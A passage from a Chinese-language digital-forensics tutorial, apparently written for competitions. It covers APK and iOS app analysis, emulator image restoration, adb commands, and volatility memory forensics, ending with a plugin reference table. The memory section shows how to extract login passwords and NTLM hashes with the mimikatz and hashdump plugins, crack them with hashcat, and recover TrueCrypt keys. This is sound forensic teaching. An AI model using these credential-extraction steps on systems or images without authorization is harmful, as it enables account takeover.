alt="image-20230905114444521"></p></li><li><p><strong>雷电APP智能分析</strong></p><p>在<strong>详细信息</strong>栏中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912232028022.png" alt="image-20230912232028022"></p></li></ol><h4 id="主入口-Main-Activity"><a href="#主入口-Main-Activity" class="headerlink" title="主入口(Main Activity)"></a>主入口(Main Activity)</h4><div class="note info flat"><p><strong>Activity</strong>是Android的核心类（android.app.Activity）,在Activity类有onCreate事件方法，一般用于对Activity进行初始化，并且通过setContentView方法将View放到Activity上，绑定后，Activity会显示View上的控件。</p></div><p>每种语言都有一个程序入口（如：C#main函数），而Android程序的入口就是Main Activity函数。</p><p><strong>分析工具</strong></p><ol><li><p><strong>APK Messenger</strong></p><p>将apk文件拖入APK Messenger，在更多信息中会显示主入口</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905231410219.png" alt="image-20230905231410219"></p></li><li><p><strong>MobSF</strong>（启动时最好打开梯子，因为要检查更新）</p><p>使用工具<strong>MobSF</strong>分析apk数据包，签名序列号为报告中的<strong>Main Activity</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905225011434.png" alt="image-20230905225011434"></p></li><li><p><strong>雷电APP智能分析</strong></p><p>在<strong>详细信息</strong>栏中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912232931505.png" alt="image-20230912232931505"></p></li></ol><h4 id="DCLOUD-AD-ID"><a href="#DCLOUD-AD-ID" class="headerlink" title="DCLOUD_AD_ID"></a>DCLOUD_AD_ID</h4><div class="note info flat"><p><strong>DCLOUD_AD_ID</strong>值是uni-AD联盟ID，用于配置离线广告。Android平台已经合并到DCLOUD_STREAMAPP_CHANNEL中，已不再使用</p></div><p><strong>分析工具</strong></p><ol><li><p><strong>jadx</strong></p><p>使用工具jadx反编译apk安装包，在得到的资源文件全局查询<strong>dcloud_ad_id</strong>，整改的相应属性及对应的值<code>2147483647</code></p></li><li><p><strong>雷电APP智能分析</strong></p><p>在<strong>第三方服务栏</strong>中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912232122054.png" alt="image-20230912232122054"></p></li></ol><h4 id="服务器域名"><a href="#服务器域名" class="headerlink" title="服务器域名"></a>服务器域名</h4><p>apk的服务器域名即为app提供服务器服务的域名</p><p><strong>分析工具</strong></p><ol><li><p><strong>burpsuite</strong>+<strong>雷电模拟器</strong></p><p>将软件安装在雷电模拟器上，打开后使用bupsuite进行抓包</p><details class="toggle" ><summary class="toggle-button" style="">为Burp Suite配置手机端的抓包</summary><div class="toggle-content"><p>为burp配置本机的IP和端口</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905223249457.png" alt="image-20230905223249457"></p><p>在模拟器中点击连接上的wifi，将代理设置为手动</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905223429802.png" alt="image-20230905223429802"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905223622087.png" alt="image-20230905223622087"></p><p>配置本机ip和端口</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905223733330.png" alt="image-20230905223733330"></p></div></details><p>服务器域名为打开app时请求的<strong>目的地host</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905224347406.png" alt="image-20230905224347406"></p></li><li><p>雷电APP智能分析</p><div class="note info flat"><p>雷电APP智能分析软件目前提</p><p>供了4种抓包方式，分别是 HTTP、TCP、代理模式、TCPDump，Android 支持</p><p>全部4种方式，iOS 目前只支持代理模式抓包，下面分别介绍四种方式的应用</p><p>场景：</p><p>1、<strong>HTTP 方式</strong>是基于手机 VPN 原理实现的抓包，一般情况下如果是要抓HTTP</p><p>协议的网络数据包推荐这种方式，不过后台服务器已经不在运行的情况下使用该</p><p>方式无法抓取到网络数据包。</p><p>2、<strong>TCP 方式</strong>同样是基于手机 VPN 原理实现的抓包，如果网络数据包是原生</p><p>TCP 协议的话推荐使用这种方式。</p><p>3、<strong>代理模式</strong>是基于在手机或者模拟器上设置代理地址实现的抓包（和</p><p>fiddler、charles 原理相同），软件会自动设置代理 IP 地址，无需手动填写代</p><p>理地址，这种方式的优点是后台服务器不在运行的情况下也能抓到请求的网络数</p><p>据包。</p><p>4、<strong>TCPDump 模式</strong>是基于 libpcap 库的抓包，根据使用者的定义对网络上的</p><p>数据包进行截获，可以将网络中传送的数据包完全截获下来提供分析，这种方式</p><p>的优点是可以抓取到所有协议的网络数据包。</p></div><p>使用<strong>网络数据包</strong>栏中的HTTP数据包抓取功能</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912233218880.png" alt="image-20230912233218880"></p></li><li><p><strong>模拟器仿真</strong></p><p>在模拟器中直接打开APP，有时会显示连接的网页，即服务器域名</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230913002844293.png" alt="image-20230913002844293"></p></li></ol><h4 id="危险权限"><a href="#危险权限" class="headerlink" title="危险权限"></a>危险权限</h4><p>申请权限信息的记录，一般存放于AndroidManifest.xml</p><p><strong>分析工具</strong></p><ol><li><p><strong>MobSF</strong>（启动时最好打开梯子，因为要检查更新）</p><p><strong>Permissions模块*</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905235754416.png" alt="image-20230905235754416"></p></li><li><p><strong>APK Messenger</strong></p><p>将apk文件拖入APK Messenger后，可以查看权限信息</p></li><li><p><strong>雷电APP智能分析</strong></p><p>在<strong>静态权限</strong>栏中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912233846479.png" alt="image-20230912233846479"></p></li></ol><h4 id="窗口（界面）数量"><a href="#窗口（界面）数量" class="headerlink" title="窗口（界面）数量"></a>窗口（界面）数量</h4><p>在Android系统中<strong>窗口被成为Activity（活动）</strong></p><p>每个活动都必须在<code>AndroidManifest.xml</code>清单中声明</p><p>所以数该文件中有几个activity标签即可</p><p>例如下面这个软件就有3个界面</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230913143039578.png" alt="image-20230913143039578"></p><h3 id="ipa取证"><a href="#ipa取证" class="headerlink" title="ipa取证"></a>ipa取证</h3><p>将ipa安装包文件的后缀改为<code>.zip</code>后解压，可以在目录下找到找到<code>info.plist</code>文件。</p><p>有关苹果app的大部分信息都能在中间找到</p><h4 id="包名-1"><a href="#包名-1" class="headerlink" title="包名"></a>包名</h4><p>在info.plist中暴搜<code>CFBundleIdentifier</code></p><h4 id="进程id"><a href="#进程id" class="headerlink" title="进程id"></a>进程id</h4><p>在info.plist中暴搜<code>CFBundleExecutable</code>或<code>CFBundleName</code></p><h4 id="APIKEY"><a href="#APIKEY" class="headerlink" title="APIKEY"></a>APIKEY</h4><p>在info.plist中暴搜<code>APIKey</code></p><h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p>在info.plist中也可以找到</p><h3 id="手机取证-3"><a href="#手机取证-3" class="headerlink" title="手机取证"></a>手机取证</h3><h4 id="安卓文件结构"><a href="#安卓文件结构" class="headerlink" title="安卓文件结构"></a>安卓文件结构</h4><ul><li>/data 数据分区存放用户安装的软件以及各种数据（存放着比如微信聊天记录等应用数据）</li><li>/system 系统分区 /app 存放系统应用（天气、设置等）</li><li>/recovery 恢复分区</li><li>/cache 缓存临时文件</li><li>/boot 内核分区</li><li>/init 系统启动文件</li><li>/SDCard分区 挂载的SD卡 （可能存放一些图片音频）</li></ul><h4 id="移动终端取证分析"><a href="#移动终端取证分析" class="headerlink" title="移动终端取证分析"></a>移动终端取证分析</h4><h5 id="确定手机操作系统"><a href="#确定手机操作系统" class="headerlink" title="确定手机操作系统"></a>确定手机操作系统</h5><p><strong>苹果手机</strong>的备份一般包含<strong>AppleBackupFS</strong>文件</p><p><strong>华为手机</strong>的备份则为<strong>HuaweiBackup</strong></p><h4 id="手机模拟器取证分析"><a href="#手机模拟器取证分析" class="headerlink" title="手机模拟器取证分析"></a>手机模拟器取证分析</h4><p>有的手机取证题目会给出手机的内存镜像文件，后缀为<strong>vmdk</strong>，可供解题者进行仿真</p><p>使用手机模拟器能够还原系统文件以及数据，并在可视化界面中进行<strong>更符合直觉的操作</strong></p><p>比如说如果你想查看图片，直接打开模拟器中的相册即可；</p><p>如果想要取证某个聊天软件，直接打开软件就能直观地看到聊天记录</p><h5 id="确认模拟器"><a href="#确认模拟器" class="headerlink" title="确认模拟器"></a>确认模拟器</h5><p><strong>雷电模拟器</strong>的镜像文件特点为包含<code>data.vmdk</code>、<code>sdcard.vmdk</code>、<code>system.vmdk</code>三个文件</p><p><strong>雷电模拟器</strong>的备份文件的后缀为<code>.ldbk</code></p><p><strong>逍遥模拟器</strong>的镜像文件格式如下图</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910103811053.png" alt="image-20230910103811053"></p><p><strong>MuMu模拟器</strong>的镜像文件格式如下图</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910103853719.png" alt="image-20230910103853719"></p><h5 id="还原镜像和备份"><a href="#还原镜像和备份" class="headerlink" title="还原镜像和备份"></a>还原镜像和备份</h5><div class="note warning flat"><p>这里只演示雷电模拟器还原镜像和备份的操作，其他模拟器类似</p></div><ol><li><p><strong>处理镜像文件</strong></p><p>在雷电模拟器的vms目录下新建一个文件夹</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910102400599.png" alt="image-20230910102400599"></p><p><strong>将题目检材拖拽到该文件夹下</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910102514537.png" alt="image-20230910102514537"></p><p>打开<strong>雷电多开器</strong>后即可看到刚刚创建的手机仿真<img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910102550888.png" alt="image-20230910102550888"></p><p>点击启动即可</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910102714206.png" alt="image-20230910102714206"></p></li><li><p><strong>处理备份文件</strong></p><p>打开雷电多开器，新建一个模拟器</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910103258663.png" alt="image-20230910103258663"></p><p>选择<strong>备份与还原</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910103331124.png" alt="image-20230910103331124"></p><p>点击还原，并选中<code>.ldbk</code>的备份文件即可</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910103433596.png" alt="image-20230910103433596"></p></li></ol><h5 id="软件包名"><a href="#软件包名" class="headerlink" title="软件包名"></a>软件包名</h5><p><strong>分析工具</strong></p><ol><li><p><strong>Magnet AXIOM</strong></p><p>证据来源选择移动&gt;</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230906091718529.png" alt="image-20230906091718529"><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230906091809692.png" alt="image-20230906091809692"></p><p>加载证据选择<strong>镜像data.vmdk</strong></p><p>选择使用痕迹中的移动设备</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230906092239093.png" alt="image-20230906092239093"></p><p>可以看到相关软件的包名</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230906092400947.png" alt="image-20230906092400947"></p></li></ol><h5 id="本机与模拟器文件交互"><a href="#本机与模拟器文件交互" class="headerlink" title="本机与模拟器文件交互"></a>本机与模拟器文件交互</h5><p>这里用到<strong>adb</strong>工具</p><p>该工具一般会伴随模拟器一起下载，一般在模拟器的主目录下，双击即可运行</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910110310592.png" alt="image-20230910110310592"></p><p><strong>雷电模拟器</strong>adb为默认端口</p><p><strong>夜神模拟器</strong>adb调试端口为<code>adb connect 127.0.0.1:62001</code>，如果不正确可以参考逍遥的方法</p><p><strong>逍遥模拟器</strong>adb调试端口可以在镜像的配置文件中查找</p><p>在逍遥模拟器的vms目录下找到对应模拟器文件夹，找到后缀为<code>.memi-prev</code>的文件，文件内搜索adb即可找到端口</p><p>adb<strong>常用命令</strong>如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前已连接的设备</span></span><br><span class="line">adb devices</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接当前设备</span></span><br><span class="line">adb shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接指定设备</span></span><br><span class="line">adb -s 设备名 shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装app</span></span><br><span class="line">adb install 要安装的apk路径</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载app</span></span><br><span class="line">adb uninstall apk的包名</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将外部数据导入模拟器或手机</span></span><br><span class="line">adb push 本地路径 设备路径</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将模拟器或者手机数据导出到外部</span></span><br><span class="line">adb pull 设备路径 本地路径</span><br></pre></td></tr></table></figure><div class="note primary flat"><p>在模拟器中也可以通过拖拽实现本机和模拟器文件交互</p></div><h3 id="exe分析-1"><a href="#exe分析-1" class="headerlink" title="exe分析"></a>exe分析</h3><h4 id="分析工具"><a href="#分析工具" class="headerlink" title="分析工具"></a>分析工具</h4><p>分析exe类型的文件时通常会用到沙箱平台</p><p>比较好用的有以下这些：</p><p><a href="https://s.threatbook.com/">微步在线云沙箱 (threatbook.com)</a></p><p><a href="https://sandbox.ti.qianxin.com/sandbox/page">奇安信情报沙箱 (qianxin.com)</a></p><h3 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证"></a>计算机取证</h3><h4 id="镜像哈希值"><a href="#镜像哈希值" class="headerlink" title="镜像哈希值"></a>镜像哈希值</h4><p><strong>分析工具</strong></p><ol><li><p><strong>盘古石计算机取证分析系统</strong></p><p>导入镜像文件，在检材文件阶段就能看到有关镜像的一些信息</p><p>属性中有<strong>MD5、SHA256、SHA1</strong>三种哈希值</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910143358932.png" alt="image-20230910143358932"></p></li><li><p><strong>X-Ways</strong></p><p>将镜像文件添加之后，右键选择属性</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910144615328.png" alt="image-20230910144615328"></p><p>可以得到镜像的SHA-1值和MD5值</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910144654733.png" alt="image-20230910144654733"></p></li></ol><h4 id="取证员-exmainer"><a href="#取证员-exmainer" class="headerlink" title="取证员(exmainer)"></a>取证员(exmainer)</h4><p><strong>分析工具</strong></p><p><strong>Xways</strong></p><p>将镜像文件添加到工具<strong>X-Ways</strong>，右键选择属性</p><p>检察员为案件描述中<strong>Examiner</strong>字段的值<code>pgs</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910144836605.png" alt="image-20230910144836605"></p><h4 id="操作系统基本信息"><a href="#操作系统基本信息" class="headerlink" title="操作系统基本信息"></a>操作系统基本信息</h4><p>比如安装时间、用户ID、上一次登录时间等等</p><p><strong>分析工具</strong></p><p><strong>盘古石计算机取证分析系统</strong></p><p>在导入镜像后选择分析基本信息</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910172137871.png" alt="image-20230910172137871"></p><p>可以得到与操作系统相关的信息</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910172326744.png" alt="image-20230910172326744"></p><h4 id="安装过的软件"><a href="#安装过的软件" class="headerlink" title="安装过的软件"></a>安装过的软件</h4><p>分析系统安装过的软件时，不仅要分析注册在系统内的安装信息，还要结合用户使用痕迹来看</p><p><strong>分析工具</strong></p><p><strong>盘古石计算机取证分析系统</strong></p><p>在<strong>盘古石计算机取证分析系统</strong>中需要在导入镜像后选择分析基本信息</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910173048893.png" alt="image-20230910173048893"></p><h4 id="浏览器保存的密码"><a href="#浏览器保存的密码" class="headerlink" title="浏览器保存的密码"></a>浏览器保存的密码</h4><p>Chrome的密钥填充具有保护机制，一旦清除windows开机密码后登录，Chrome保存的密钥就会被破坏</p><p>所以当有题目涉及到浏览器保存的密码时，使用仿真系统一定要<strong>保留开机密码</strong></p><h3 id="内存取证-1"><a href="#内存取证-1" class="headerlink" title="内存取证"></a>内存取证</h3><h4 id="内存镜像后缀"><a href="#内存镜像后缀" class="headerlink" title="内存镜像后缀"></a>内存镜像后缀</h4><p>常见的内存镜像后缀有<code>.raw</code> 、<code>.vmem</code> 、<code>.img</code>、<code>.mem</code></p><h4 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h4><p>内存取证主要会用到工具<strong>volatility</strong>（推荐在kali下使用）</p><p>语法：<code>python2 vol.py -f [对象] --profile=[操作系统] [插件参数]</code></p><div class="note primary flat"><p>使用时为了输入路径方便可以把内存文件丢到volatility目录下</p></div><h4 id="内存镜像中的操作系统"><a href="#内存镜像中的操作系统" class="headerlink" title="内存镜像中的操作系统"></a>内存镜像中的操作系统</h4><p>内存取证的第一步是确定操作系统的类型</p><p>首先用<code>python2 vol.py -f xxx.mem imageinfo</code>命令判断是什么操作系统</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910203408442.png" alt="image-20230910203408442"></p><h4 id="内存创建时间"><a href="#内存创建时间" class="headerlink" title="内存创建时间"></a>内存创建时间</h4><p>内存创建时间同样是在imageinfo中查看</p><p>上方为<strong>格林尼治时间</strong>，下方为<strong>按本地时区换算后的时间</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910203520398.png" alt="image-20230910203520398"></p><h4 id="内存中计算机开机密码"><a href="#内存中计算机开机密码" class="headerlink" title="内存中计算机开机密码"></a>内存中计算机开机密码</h4><p>使用volatility工具的插件<strong>mimikatz</strong></p><p>在使用还需安装依赖包<code>pip2 install construct</code></p><p>命令为<code>python2 vol.py -f xxx.mem --profile=xxx mimikatz</code></p><p>得到账号和密码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910210120621.png" alt="image-20230910210120621"></p><h4 id="USB设备信息"><a href="#USB设备信息" class="headerlink" title="USB设备信息"></a>USB设备信息</h4><p>使用volatility工具的插件<strong>usbstor</strong></p><p>命令为<code>python2 vol.py -f xxx.mem --profile=xxx usbstor</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910212431982.png" alt="image-20230910212431982"></p><h4 id="用户哈希值"><a href="#用户哈希值" class="headerlink" title="用户哈希值"></a>用户哈希值</h4><p>使用volatility工具的插件<strong>hashdump</strong></p><p>显示结果中左边为<strong>LMHash</strong>，右边是<strong>NTLM Hash</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910213113328.png" alt="image-20230910213113328"></p><h4 id="用户密码"><a href="#用户密码" class="headerlink" title="用户密码"></a>用户密码</h4><p>使用volatility工具的插件<strong>mimikatz</strong></p><p>或者用<strong>hashdump</strong>获得密码的哈希值以后用hashcat爆破或者用解密网站解密</p><h4 id="访问文件记录"><a href="#访问文件记录" class="headerlink" title="访问文件记录"></a>访问文件记录</h4><p>使用volatility工具的插件<strong>timeliner</strong>（时间可能较慢）</p><p>timeliner会将所有操作系统事件以时间线的方式展开，包括各种痕迹信息</p><p>命令为<code>python2 vol.py -f xxx.mem --profile=xxx timeliner &gt; ../timeliner.txt</code></p><p>输出结果在上一层目录的<code>timeliner.txt</code>中，再到其中查找记录</p><p>其中文件名中的中文均用url编码表示</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910220528039.png" alt="image-20230910220528039"></p><h4 id="系统进程信息"><a href="#系统进程信息" class="headerlink" title="系统进程信息"></a>系统进程信息</h4><p>使用volatility工具的插件<strong>pslist</strong>和<strong>psscan</strong>可以查看存在的进程</p><p><strong>pslist</strong>会按照EPROCESS列表打印所有<strong>正在运行</strong>的进程，包括其PID信息及最后一次执行的时间</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910222745497.png" alt="image-20230910222745497"></p><p><strong>psscan</strong>会扫描进程对象池，显示<strong>非活跃或隐藏</strong>进程</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910223141990.png" alt="image-20230910223141990"></p><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>使用插件<strong>envars</strong>可以查看进程环境变量</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910230227607.png" alt="image-20230910230227607"></p><h4 id="IE浏览器历史记录"><a href="#IE浏览器历史记录" class="headerlink" title="IE浏览器历史记录"></a>IE浏览器历史记录</h4><p>使用volatility工具的插件<strong>iehistory</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910225703137.png" alt="image-20230910225703137"></p><h4 id="cmd命令记录"><a href="#cmd命令记录" class="headerlink" title="cmd命令记录"></a>cmd命令记录</h4><p>使用volatility工具的插件<strong>cmdscan</strong>和<strong>consoles</strong></p><p><strong>cmdscan</strong>检查从cmd.exe输入的命令记录</p><p><strong>consoles</strong>收集键入cmd.exe的命令和返回内容</p><h4 id="剪贴板信息"><a href="#剪贴板信息" class="headerlink" title="剪贴板信息"></a>剪贴板信息</h4><p>使用volatility工具的插件<strong>clipboard</strong></p><h4 id="系统IP"><a href="#系统IP" class="headerlink" title="系统IP"></a>系统IP</h4><p>使用volatility工具的插件<strong>netscan</strong></p><h4 id="volatility插件速查表"><a href="#volatility插件速查表" class="headerlink" title="volatility插件速查表"></a>volatility插件速查表</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>apihooks</td><td>检测内核及进程的内存空间中的API hook</td></tr><tr><td>atoms</td><td>列出会话及窗口站atom表</td></tr><tr><td>atomscan</td><td>Atom表的池扫描(Pool scanner)</td></tr><tr><td>auditpol</td><td>列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</td></tr><tr><td>bigpools</td><td>使用BigPagePoolScanner转储大分页池(big page pools)</td></tr><tr><td>bioskbd</td><td>从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</td></tr><tr><td>cachedump</td><td>获取内存中缓存的域帐号的密码哈希</td></tr><tr><td>callbacks</td><td>打印全系统通知例程</td></tr><tr><td>crashinfo</td><td>提取崩溃转储信息</td></tr><tr><td>deskscan</td><td>tagDESKTOP池扫描(Poolscaner)</td></tr><tr><td>devicetree</td><td>显示设备树信息</td></tr><tr><td>dlldump</td><td>从进程地址空间转储动态链接库</td></tr><tr><td>driverirp</td><td>IRP hook驱动检测</td></tr><tr><td>drivermodule</td><td>关联驱动对象至内核模块</td></tr><tr><td>driverscan</td><td>驱动对象池扫描</td></tr><tr><td>dumpcerts</td><td>提取RAS私钥及SSL公钥</td></tr><tr><td>dumpregistry</td><td>转储内存中注册表信息至磁盘</td></tr><tr><td>eventhooks</td><td>打印Windows事件hook详细信息</td></tr><tr><td>evtlogs</td><td>提取Windows事件日志（仅支持XP/2003)</td></tr><tr><td>gahti</td><td>转储用户句柄（handle）类型信息</td></tr><tr><td>gditimers</td><td>打印已安装的GDI计时器(timers)及回调(callbacks)</td></tr><tr><td>gdt</td><td>显示全局描述符表(Global Deor Table)</td></tr><tr><td>getservicesids</td><td>获取注册表中的服务名称并返回SID信息</td></tr><tr><td>getsids</td><td>打印每个进程的SID信息</td></tr><tr><td>handles</td><td>打印每个进程打开的句柄的列表</td></tr><tr><td>hivescan</td><td>注册表配置单元池扫描</td></tr><tr><td>hpakextract</td><td>从HPAK文件（Fast Dump格式）提取物理内存数据</td></tr><tr><td>hpakinfo</td><td>查看HPAK文件属性及相关信息</td></tr><tr><td>idt</td><td>显示中断描述符表(Interrupt Deor Table)</td></tr><tr><td>hibinfo</td><td>转储休眠文件信息</td></tr><tr><td>imagecopy</td><td>将物理地址空间导出原生DD镜像文件</td></tr><tr><td>impscan</td><td>扫描对导入函数的调用</td></tr><tr><td>joblinks</td><td>打印进程任务链接信息</td></tr><tr><td>kdbgscan</td><td>搜索和转储潜在KDBG值</td></tr><tr><td>kpcrscan</td><td>搜索和转储潜在KPCR值</td></tr><tr><td>ldrmodules</td><td>检测未链接的动态链接DLL</td></tr><tr><td>lsadump</td><td>从注册表中提取LSA密钥信息（已解密）</td></tr><tr><td>machoinfo</td><td>转储Mach-O 文件格式信息</td></tr><tr><td>malfind</td><td>查找隐藏的和插入的代码</td></tr><tr><td>mbrparser</td><td>扫描并解析潜在的主引导记录(MBR)</td></tr><tr><td>memmap</td><td>打印内存映射</td></tr><tr><td>messagehooks</td><td>桌面和窗口消息钩子的线程列表</td></tr><tr><td>moddump</td><td>转储内核驱动程序到可执行文件的示例</td></tr><tr><td>modscan</td><td>内核模块池扫描</td></tr><tr><td>modules</td><td>打印加载模块的列表</td></tr><tr><td>multiscan</td><td>批量扫描各种对象</td></tr><tr><td>mutantscan</td><td>对互斥对象池扫描</td></tr><tr><td>objtypescan</td><td>扫描窗口对象类型对象</td></tr><tr><td>patcher</td><td>基于页面扫描的补丁程序内存</td></tr><tr><td>poolpeek</td><td>可配置的池扫描器插件</td></tr><tr><td>privs</td><td>显示进程权限</td></tr><tr><td>procdump</td><td>进程转储到一个可执行文件示例</td></tr><tr><td>psxview</td><td>查找带有隐藏进程的所有进程列表</td></tr><tr><td>qemuinfo</td><td>转储 Qemu 信息</td></tr><tr><td>raw2dmp</td><td>将物理内存原生数据转换为windbg崩溃转储格式</td></tr><tr><td>servicediff</td><td>Windows服务列表(ala Plugx)</td></tr><tr><td>sessions</td><td><code>_MM_SESSION_SPACE</code>的详细信息列表(用户登录会话)</td></tr><tr><td>shellbags</td><td>打印Shellbags信息</td></tr><tr><td>shutdowntime</td><td>从内存中的注册表信息获取机器关机时间</td></tr><tr><td>sockets</td><td>打印已打开套接字列表</td></tr><tr><td>sockscan</td><td>TCP套接字对象池扫描</td></tr><tr><td>ssdt</td><td>显示SSDT条目</td></tr><tr><td>strings</td><td>物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</td></tr><tr><td>timers</td><td>打印内核计时器及关联模块的DPC</td></tr><tr><td>truecryptmaster Recover</td><td>恢复TrueCrypt 7.1a主密钥</td></tr><tr><td>truecryptpassphrase</td><td>查找并提取TrueCrypt密码</td></tr><tr><td>truecryptsummary</td><td>TrueCrypt摘要信息</td></tr><tr><td>unloadedmodules</td><td>打印卸载的模块信息列表</td></tr><tr><td>userhandles</td><td>转储用户句柄表</td></tr><tr><td>vaddump</td><td>转储VAD数据为文件</td></tr><tr><td>vadinfo</td><td>转储VAD信息</td></tr><tr><td>vadtree</td><td>以树形方式显示VAD树信息</td></tr><tr><td>vadwalk</td><td>显示遍历VAD树</td></tr><tr><td>vboxinfo</td><td>转储Virtualbox信息（虚拟机）</td></tr><tr><td>windows</td><td>打印桌面窗口(详细信息)</td></tr><tr><td>wintree</td><td>顺序打印桌面窗口树</td></tr><tr><td>wndscan</td><td>池扫描窗口站</td></tr><tr><td>yarascan</td><td>以Yara签名扫描进程或内核内存</td></tr><tr><td>vmwareinfo</td><td>转储VMware VMSS/VMSN 信息</td></tr><tr><td>symlinkscan</td><td>符号链接对象池扫描</td></tr><tr><td>thrdscan</td><td>线程对象池扫描</td></tr></tbody></table></div><h3 id="服务器取证-1"><a href="#服务器取证-1" class="headerlink" title="服务器取证"></a>服务器取证</h3><p>一般服务器都是搭载在<strong>linux系统</strong>之上，所以服务器取证更多的是对linux指令、运维知识以及数据库语句的考察</p><p>由于Linux系统是开源的，因此许多操作系统和安全工具都可以在Linux系统上运行，这为电子数据取证提供了更多的可能性和工具。</p><h4 id="取证中常用linux指令"><a href="#取证中常用linux指令" class="headerlink" title="取证中常用linux指令"></a>取证中常用linux指令</h4><p>linux指令的<strong>基本格式</strong>为：<code>command [-options] [parameter]</code></p><p>其中command为指令名</p><p>options为一些附加功能的选项</p><p>而parameter为参数，如文件名、目录名</p><p>在服务器取证中，linux常用的指令有ls、pwd、cat、chmod、find等等</p><p>下面我会一一说明使用方法</p><h5 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h5><p><strong>功能</strong></p><p><code>ls</code>会默认列出当前目录中的子目录或文件。</p><p><code>ls 路径</code>可以指定想要查看的目录。</p><p><strong>选项</strong></p><p><code>-l</code>可以查看某一个目录中内容的相关信息，包括权限、所有者、大小、创建时间等。</p><p><code>-A</code>会把某一个目录中的隐藏文件也显示出来，有<code>.</code>前缀的为隐藏文件</p><p><code>-t</code>会按照修改时间排序显示当前目录中的文件和目录</p><p><strong>搭配模式匹配</strong></p><p>ls命令还可以使用通配符进行模式匹配，例如 <strong>*</strong> 表示匹配任意字符，<strong>?</strong> 表示匹配一个字符，<strong>[…]</strong> 表示匹配指定范围内的字符。例如：</p><figure class="highlight plaintext"><table><tr><td 